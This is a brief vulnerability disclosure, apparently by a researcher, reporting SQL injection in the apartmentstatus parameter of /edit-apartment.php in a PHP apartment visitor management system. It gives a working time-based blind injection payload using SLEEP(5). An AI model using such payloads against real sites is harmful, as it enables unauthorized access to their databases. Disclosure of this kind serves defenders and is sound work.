# The apartment visitor management system has SQL injection vulnerability

## Vulnerability author:wanglun

supplier:
https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

edition: 
1.0

/edit-apartment.php

SQL injection exists in the apartmentstatus parameter

Payload:  apartmentstatus=Empty' AND (SELECT 3542 FROM (SELECT(SLEEP(5)))BMaV) AND 'Dhxm'='Dhxm&submit=

![bc0709c68e6746ca9f3d7a92313156c](https://github.com/user-attachments/assets/0b0d0206-1e1e-43fa-aabd-92e333e3e8ec)

![image](https://github.com/user-attachments/assets/d1796cf7-cbb6-4805-b82d-ccb882f43856)
